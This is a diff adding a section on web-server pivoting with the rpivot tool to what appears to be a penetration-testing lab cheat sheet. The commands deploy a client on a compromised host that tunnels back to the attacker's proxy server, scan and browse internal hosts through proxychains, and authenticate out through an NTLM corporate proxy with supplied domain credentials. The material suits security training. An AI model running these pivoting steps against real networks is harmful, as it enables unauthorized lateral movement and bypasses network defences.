@@ -1194,6 +1194,24 @@ set RHOST 10.129.202.64
 set LPORT 8080
 run
 ```
+##### Web Server Pivoting with Rpivot
+```
+attack machine -> git clone https://github.com/klsecservices/rpivot.git
+attack machine -> python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+attack machine -> scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
+
+Pivot machine -> python2 client.py --server-ip 10.10.14.18 --server-port 9999
+
+attack machine -> configure proxychains
+attack machine -> proxychains nmap IP -pPort
+attack machine -> proxychains firefox-esr 172.16.5.135:80
+attack machine -> proxychains curl --noproxy '*' http://172.16.5.135:80
+
+## Connecting to a Web Server using HTTP-Proxy & NTLM Auth ---> here could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way
+
+Pivot machine -> python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
+
+``` 
 ## Attacking Common Services
 ##### Attacking FTP
 ```
